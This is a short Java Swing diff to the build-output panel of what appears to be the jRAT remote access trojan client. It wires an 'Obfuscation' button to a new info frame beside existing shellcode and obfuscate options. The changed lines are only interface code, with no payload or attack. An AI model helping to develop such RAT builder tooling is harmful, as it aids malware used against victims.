@@ -8,6 +8,7 @@ import javax.swing.ButtonGroup;
 import javax.swing.GroupLayout;
 import javax.swing.GroupLayout.Alignment;
 import javax.swing.JButton;
+import javax.swing.JCheckBox;
 import javax.swing.JPanel;
 import javax.swing.JRadioButton;
 import javax.swing.LayoutStyle.ComponentPlacement;
@@ -15,12 +16,14 @@ import javax.swing.LayoutStyle.ComponentPlacement;
 import pro.jrat.client.Help;
 import pro.jrat.client.ShellcodeGenerator;
 import pro.jrat.client.ui.frames.FrameExecutableInfo;
-import javax.swing.JCheckBox;
+import pro.jrat.client.ui.frames.FrameObfuscationInfo;
 
 @SuppressWarnings("serial")
 public class PanelBuildOutput extends JPanel {
 
 	public FrameExecutableInfo frameExecutableInfo = new FrameExecutableInfo();
+	public FrameObfuscationInfo frameObfuscationInfo = new FrameObfuscationInfo();
+	
 	private final ButtonGroup buttonGroup = new ButtonGroup();
 	private final ButtonGroup buttonGroup_1 = new ButtonGroup();
 	private JRadioButton rdbtnShellcode;
@@ -136,6 +139,11 @@ public class PanelBuildOutput extends JPanel {
 		});
 		
 		btnObfuscationInfo = new JButton("Obfuscation");
+		btnObfuscationInfo.addActionListener(new ActionListener() {
+			public void actionPerformed(ActionEvent arg0) {
+				frameObfuscationInfo.setVisible(true);
+			}
+		});
 		
 		chckbxObfuscate = new JCheckBox("Obfuscate");
 		
